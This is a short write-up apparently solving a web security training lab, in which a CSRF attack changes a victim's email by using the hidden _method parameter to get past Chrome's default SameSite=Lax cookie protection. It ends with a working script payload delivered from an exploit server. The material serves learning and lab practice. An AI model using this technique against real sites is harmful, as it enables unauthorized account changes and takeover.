This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

POST /login response:
```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=3GiRMOwiwddF2x0j0VNiWNXAL0OE4edd; Expires=Thu, 15 Aug 2024 10:09:49 UTC; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
- SameSite not specified, victim uses Chrome so defaults to SameSite=Lax

```http
POST /my-account/change-email 
...
email=test%40test.net
```
- response 302 found


Hidden parameter _method can override the method
```http
GET /my-account/change-email?email=test%40test.net&_method=POST
...
```
- response 302 found


Deliver exploit to victim
```html
<script>
document.location = 'https://0a88001d041afdb782ab566900db0015.web-security-academy.net/my-account/change-email?email=changed%40test.net&_method=POST'
</script>
```